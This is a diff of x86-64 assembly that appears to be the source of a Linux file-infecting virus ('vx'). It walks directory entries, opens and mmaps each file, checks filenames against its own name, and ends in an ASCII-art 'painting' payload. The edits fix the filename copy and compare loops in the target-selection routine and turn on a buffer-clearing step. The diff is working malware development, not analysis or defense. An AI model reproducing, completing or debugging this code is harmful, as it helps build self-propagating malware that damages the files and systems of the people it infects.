@@ -428,6 +428,7 @@ process_dirents:
 	
 	xor rcx, rcx	
 	jmp check_file
+
 ;*******************************************************************************
 ;check_file:
 ;	open file -> fstat file (get file size) - > use fstat.size for mmap call & mmap file	
@@ -468,42 +469,48 @@ check_file:
 	.copy_filename:
 		lea rdi, [r14 + 200] 
 		lea rsi, [rcx + r14 + 618]
+		;lea rax, [rcx + r14 + 618]
+		;push rax
+		;push rsi
 		.copy_filename_loop:
 			mov byte al, [rsi]
 		;	movsb
-			inc rsi
 			mov byte [rdi], al
+			inc rsi
 			inc rdi
 		;	inc r12
 			cmp byte [rsi], 0x0
 			jne .copy_filename_loop
+		;call _write
 		xor rax, rax
-	
-
-	check_filename:
-		;mov rax, qword [r14 + 200]
-		lea rdi, qword [r14 + 200]
-		;lea rdi, [rcx + r14 + 617]	;linuxdirent entry filename (linuxdirent.d_nameq) in rdi
-		cmp word [rdi], 0x2e00
-		;cmp word [rcx + r14 + 617], 0x2e00
-		;xor rax, rax
-		je checknext
+		xor r12, r12
+		;pop rdi
 		jmp get_vx_name
+	
+	;check_filename:
+	;	lea rdi, qword [r14 + 200]
+	;	cmp word [rdi], 0x002e
+	;	je checknext
+	;	jmp get_vx_name
 	check_vx_name:
 		pop rsi
-		;lea rdi, [rcx + r14 + 617]
-		;push rcx
-		;xor rcx, rcx
+		;lea rax, qword [r14 + 200]
+		;mov rdi, qword [rcx + r14 + 618]
+		lea rdi, qword [r14 + 200]
+		;lea rdi, qword [r14 + 200]
+		;push rax
+		;lea rdi, qword [r14 + 200]
 		cld
 		.filenameloop:
-			cmpsb
+			mov byte al, [rsi]
+			cmp byte [rdi], al
+			;repnz cmpsb
 			jne get_filestat
 			inc r12
 			inc rdi
 			inc rsi
 			cmp r12, 5
 			jnz .filenameloop
-		;pop rcx
 		jmp checknext
 	get_vx_name:
 		call check_vx_name
@@ -587,14 +594,15 @@ check_file:
 	;is cleared (except for the first two bytes)
 	;so that target filename does not retain leftover chars
 	;from previous filename save
-		;lea rdi, [r14 + 201]
-		;xor rax, rax
-		;mov qword [rdi], 0x01
+		lea rdi, [r14 + 201]
+		xor rax, rax
+		mov qword [rdi], 0x01
 
 		pop rcx
 		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
 		cmp qword rcx, [r14 + 500]
 		jne check_file
+		;jmp _restore
 	painting:
 	call payload
 		db 0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x21,0x21,0x21,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f
@@ -1052,4 +1060,5 @@ _end:
 	xor rdi, rdi
 	mov rax, 0x3c 				;exit() syscall on x64: SYS_EXIT equ 0x3c
 	syscall	
+
 
